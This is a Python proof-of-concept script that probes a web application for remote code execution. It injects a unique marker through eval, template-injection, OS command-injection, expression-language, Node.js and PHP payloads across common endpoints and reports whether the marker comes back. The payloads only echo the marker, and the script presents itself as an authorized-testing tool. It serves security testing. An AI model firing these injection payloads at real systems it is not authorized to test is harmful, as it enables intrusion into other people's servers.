#!/usr/bin/env python3
"""
PoC: Remote Code Execution (RCE) via Injection - CVE-GENERIC-RCE-001

Vulnerability: Remote code execution through unvalidated user input passed to
server-side evaluation functions (eval, exec, template engines, OS commands).
A unique marker string is generated per run and injected via common RCE vectors.
If the marker appears in the response, code execution is confirmed.

Usage (authorized testing only):
    python poc_rce_001.py --target http://localhost:8080 --timeout 10

Exit codes:
    0 - CONFIRMED: vulnerability reproduced (marker found in response)
    1 - NOT_REPRODUCED: target does not appear vulnerable
    2 - ERROR: script encountered an error during execution

IMPORTANT: Only use against systems you have explicit written authorization
to test. Unauthorized access to computer systems is illegal.
"""

import argparse
import hashlib
import os
import sys
import time

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("[ERROR] RCE-001: 'requests' library is required. Install with: pip install requests")
    sys.exit(2)

VULN_ID = "RCE-001"


def generate_marker():
    """Generate a unique, verifiable marker string for this test run."""
    raw = f"rce-poc-{os.getpid()}-{time.time()}-{os.urandom(8).hex()}"
    digest = hashlib.sha256(raw.encode()).hexdigest()[:16]
    return f"VULN_MARKER_{digest}"


def build_payloads(marker):
    """
    Build RCE payloads targeting multiple injection contexts.
    Each payload attempts to produce the marker string in the response.
    """
    payloads = []

    # -- Python eval / exec injection --
    payloads.append({
        "category": "python_eval",
        "description": "Python eval() string concatenation",
        "param_name": "eval",
        "value": f"'{marker}'",
    })
    payloads.append({
        "category": "python_eval",
        "description": "Python eval() via __import__",
        "param_name": "expr",
        "value": f"__import__('os').popen('echo {marker}').read()",
    })
    payloads.append({
        "category": "python_eval",
        "description": "Python eval() arithmetic bypass",
        "param_name": "calc",
        "value": f"str('{marker}')",
    })

    # -- Template injection (SSTI) --
    payloads.append({
        "category": "ssti_jinja2",
        "description": "Jinja2 SSTI basic expression",
        "param_name": "name",
        "value": "{{'" + marker + "'}}",
    })
    payloads.append({
        "category": "ssti_jinja2",
        "description": "Jinja2 SSTI via config",
        "param_name": "template",
        "value": "{{config.__class__.__init__.__globals__['os'].popen('echo " + marker + "').read()}}",
    })
    payloads.append({
        "category": "ssti_mako",
        "description": "Mako template injection",
        "param_name": "page",
        "value": "${'" + marker + "'}",
    })
    payloads.append({
        "category": "ssti_tornado",
        "description": "Tornado template injection",
        "param_name": "msg",
        "value": "{%import os%}{{os.popen('echo " + marker + "').read()}}",
    })
    payloads.append({
        "category": "ssti_freemarker",
        "description": "FreeMarker SSTI",
        "param_name": "input",
        "value": "${'" + marker + "'}",
    })

    # -- OS command injection --
    payloads.append({
        "category": "os_command",
        "description": "Command injection via semicolon",
        "param_name": "cmd",
        "value": f"; echo {marker}",
    })
    payloads.append({
        "category": "os_command",
        "description": "Command injection via pipe",
        "param_name": "host",
        "value": f"| echo {marker}",
    })
    payloads.append({
        "category": "os_command",
        "description": "Command injection via backticks",
        "param_name": "ip",
        "value": f"`echo {marker}`",
    })
    payloads.append({
        "category": "os_command",
        "description": "Command injection via $() substitution",
        "param_name": "address",
        "value": f"$(echo {marker})",
    })
    payloads.append({
        "category": "os_command",
        "description": "Command injection via && chaining",
        "param_name": "ping",
        "value": f"127.0.0.1 && echo {marker}",
    })

    # -- Expression Language (EL) injection --
    payloads.append({
        "category": "el_injection",
        "description": "Java EL injection",
        "param_name": "search",
        "value": "${'" + marker + "'}",
    })
    payloads.append({
        "category": "el_injection",
        "description": "Spring SpEL injection",
        "param_name": "query",
        "value": "#{'" + marker + "'}",
    })

    # -- Node.js specific --
    payloads.append({
        "category": "nodejs_eval",
        "description": "Node.js eval injection",
        "param_name": "code",
        "value": f"require('child_process').execSync('echo {marker}').toString()",
    })

    # -- PHP specific --
    payloads.append({
        "category": "php_eval",
        "description": "PHP system() injection",
        "param_name": "debug",
        "value": f"system('echo {marker}');",
    })

    return payloads


# Common endpoint patterns where injection parameters are accepted
ENDPOINT_PATTERNS = [
    ("GET", "/"),
    ("GET", "/api/eval"),
    ("GET", "/api/execute"),
    ("GET", "/api/calc"),
    ("GET", "/api/render"),
    ("GET", "/search"),
    ("GET", "/debug"),
    ("GET", "/ping"),
    ("POST", "/api/eval"),
    ("POST", "/api/execute"),
    ("POST", "/api/render"),
    ("POST", "/api/template"),
    ("POST", "/debug"),
]


def test_payload(session, target, method, endpoint, payload_info, marker, timeout):
    """Send a single payload and check if the marker appears in the response."""
    url = target.rstrip("/") + endpoint
    param_name = payload_info["param_name"]
    value = payload_info["value"]

    try:
        if method == "GET":
            response = session.get(
                url,
                params={param_name: value},
                timeout=timeout,
                allow_redirects=False,
            )
        else:
            # Try both form-encoded and JSON body
            response = session.post(
                url,
                data={param_name: value},
                timeout=timeout,
                allow_redirects=False,
            )

        if marker in response.text:
            return {
                "url": url,
                "method": method,
                "param": param_name,
                "category": payload_info["category"],
                "description": payload_info["description"],
                "status_code": response.status_code,
                "marker_found": True,
                "response_snippet": response.text[:500],
            }

        # Also try JSON POST for API endpoints
        if method == "POST" and "api" in endpoint:
            response_json = session.post(
                url,
                json={param_name: value},
                timeout=timeout,
                allow_redirects=False,
            )
            if marker in response_json.text:
                return {
                    "url": url,
                    "method": "POST (JSON)",
                    "param": param_name,
                    "category": payload_info["category"],
                    "description": payload_info["description"],
                    "status_code": response_json.status_code,
                    "marker_found": True,
                    "response_snippet": response_json.text[:500],
                }

    except RequestException:
        pass

    return None


def check_error_based_indicators(session, target, marker, timeout):
    """
    Check for partial RCE indicators based on error message differences.
    Different errors for code vs non-code input can indicate eval() usage.
    """
    indicators = []
    test_url = target.rstrip("/") + "/api/eval"

    try:
        benign = session.get(test_url, params={"expr": "hello"}, timeout=timeout)
        syntax_err = session.get(test_url, params={"expr": "def("}, timeout=timeout)
        valid_code = session.get(test_url, params={"expr": "1+1"}, timeout=timeout)

        # If syntax error input produces a different response than benign input,
        # and valid code produces yet another, this suggests eval() processing
        responses = {
            "benign": (benign.status_code, len(benign.text)),
            "syntax_error": (syntax_err.status_code, len(syntax_err.text)),
            "valid_code": (valid_code.status_code, len(valid_code.text)),
        }

        statuses = {v[0] for v in responses.values()}
        if len(statuses) > 1:
            indicators.append({
                "type": "differential_response",
                "detail": "Different HTTP status codes for code-like vs benign input",
                "responses": responses,
            })

        # Check for stack traces or language-specific error messages
        error_keywords = [
            "SyntaxError", "NameError", "TypeError", "eval()",
            "exec()", "traceback", "Exception", "at line",
            "ReferenceError", "undefined is not",
        ]
        for kw in error_keywords:
            if kw.lower() in syntax_err.text.lower():
                indicators.append({
                    "type": "error_disclosure",
                    "detail": f"Error keyword '{kw}' found in response to malformed code input",
                })
                break

    except RequestException:
        pass

    return indicators


def run_exploit(target, timeout):
    """
    Execute the RCE PoC against the target.

    Returns:
        tuple: (exit_code, results_dict)
    """
    marker = generate_marker()
    results = {
        "vuln_id": VULN_ID,
        "target": target,
        "marker": marker,
        "status": "NOT_REPRODUCED",
        "confirmed_vectors": [],
        "partial_indicators": [],
        "total_requests": 0,
        "errors": [],
    }

    session = requests.Session()
    session.headers.update({
        "User-Agent": "VulnAnalysis-PoC/1.0 (Authorized Security Testing)",
    })

    # Verify target is reachable
    try:
        probe = session.get(target, timeout=timeout)
        print(f"[*] {VULN_ID}: Target reachable (HTTP {probe.status_code})")
    except RequestException as e:
        results["status"] = "ERROR"
        results["errors"].append(f"Target unreachable: {e}")
        return 2, results

    print(f"[*] {VULN_ID}: Unique marker for this run: {marker}")

    payloads = build_payloads(marker)
    total_tests = len(payloads) * len(ENDPOINT_PATTERNS)
    print(f"[*] {VULN_ID}: Testing {len(payloads)} payloads across {len(ENDPOINT_PATTERNS)} endpoints ({total_tests} total)")

    confirmed = False
    for method, endpoint in ENDPOINT_PATTERNS:
        if confirmed:
            break
        for payload_info in payloads:
            results["total_requests"] += 1
            result = test_payload(session, target, method, endpoint, payload_info, marker, timeout)
            if result is not None:
                results["confirmed_vectors"].append(result)
                if not confirmed:
                    print(f"[+] {VULN_ID}: RCE CONFIRMED!")
                    print(f"    Category: {result['category']}")
                    print(f"    Description: {result['description']}")
                    print(f"    Method: {result['method']} {result['url']}")
                    print(f"    Parameter: {result['param']}")
                    print(f"    Status Code: {result['status_code']}")
                    confirmed = True
                    break

    if results["confirmed_vectors"]:
        results["status"] = "CONFIRMED"
        return 0, results

    # Check for partial/error-based indicators
    print(f"[*] {VULN_ID}: Checking for error-based RCE indicators...")
    indicators = check_error_based_indicators(session, target, marker, timeout)
    results["partial_indicators"] = indicators

    if indicators:
        results["status"] = "PARTIAL"
        for ind in indicators:
            print(f"[~] {VULN_ID}: Partial indicator: {ind['type']} - {ind['detail']}")
        return 1, results

    print(f"[-] {VULN_ID}: No RCE indicators found after {results['total_requests']} requests")
    return 1, results


def main():
    parser = argparse.ArgumentParser(
        description=f"PoC for Remote Code Execution vulnerability ({VULN_ID})",
        epilog="For authorized security testing only.",
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8080",
        help="Target base URL (default: http://localhost:8080)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=30,
        help="Request timeout in seconds (default: 30)",
    )
    args = parser.parse_args()

    target = args.target.rstrip("/")
    if not target.startswith(("http://", "https://")):
        print(f"[ERROR] {VULN_ID}: Target must start with http:// or https://")
        sys.exit(2)

    print(f"[*] {VULN_ID}: Remote Code Execution PoC")
    print(f"[*] {VULN_ID}: Target: {target}")
    print(f"[*] {VULN_ID}: Timeout: {args.timeout}s")
    print(f"[*] {'=' * 60}")

    try:
        exit_code, results = run_exploit(target, args.timeout)
    except KeyboardInterrupt:
        print(f"\n[!] {VULN_ID}: Interrupted by user")
        sys.exit(2)
    except Exception as e:
        print(f"[ERROR] {VULN_ID}: Unhandled exception: {e}")
        sys.exit(2)

    print(f"[*] {'=' * 60}")
    status = results["status"]
    if status == "CONFIRMED":
        print(f"[CONFIRMED] {VULN_ID}: Remote code execution vulnerability confirmed")
        print(f"    Confirmed vectors: {len(results['confirmed_vectors'])}")
        for vec in results["confirmed_vectors"]:
            print(f"      - {vec['category']}: {vec['description']}")
    elif status == "PARTIAL":
        print(f"[PARTIAL] {VULN_ID}: Partial RCE indicators found, manual review needed")
    elif status == "ERROR":
        print(f"[ERROR] {VULN_ID}: {'; '.join(results['errors'])}")
    else:
        print(f"[NOT_REPRODUCED] {VULN_ID}: Remote code execution not reproduced")

    sys.exit(exit_code)


if __name__ == "__main__":
    main()
